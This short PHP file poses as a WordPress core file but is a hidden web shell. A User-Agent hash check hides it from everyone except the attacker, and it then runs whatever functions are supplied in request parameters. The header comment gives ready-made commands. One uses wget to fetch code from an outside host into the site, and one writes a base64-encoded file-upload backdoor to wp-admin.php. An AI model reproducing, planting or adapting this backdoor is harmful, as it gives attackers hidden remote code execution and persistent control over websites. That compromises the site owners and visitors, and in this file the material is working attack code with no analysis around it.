<?php
/**
 * wp-include.php?index[]=&index[]=call_user_func&index[]=system&index[]=trim&index[]=wget%20-O%20output.php%20http://api.cfshserver.top/shetest/?file=wplog2.txt
 * wp-include.php?index[]=&index[]=file_put_contents&index[]=wp-admin.php&index[]=base64_decode&index[]=PD9waHANCmlmICghZW1wdHkoJF9GSUxFU1sibXlGaWxlIl0pKSB7DQoJbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbIm15RmlsZSJdWyJ0bXBfbmFtZSJdLCAkX0ZJTEVTWyJteUZpbGUiXVsibmFtZSJdKTsNCn0NCmVjaG8gJzxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCBuYW1lPSJteUZpbGUiIHR5cGU9ImZpbGUiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzdWJtaXQiPjwvZm9ybT4nOw0KZGllOw0K
 */
if (md5(md5(md5($_SERVER['HTTP_USER_AGENT']))) != '0717b2bae59931c0be946cd10c8be269') {
    header('HTTP/1.1 404 Not Found');
    header("status: 404 Not Found");
    die();
}
if ($li7ieq =    @$_REQUEST['index']){
    $li7ieq[1]($li7ieq[2], $li7ieq[3]($li7ieq[4]));exit;
}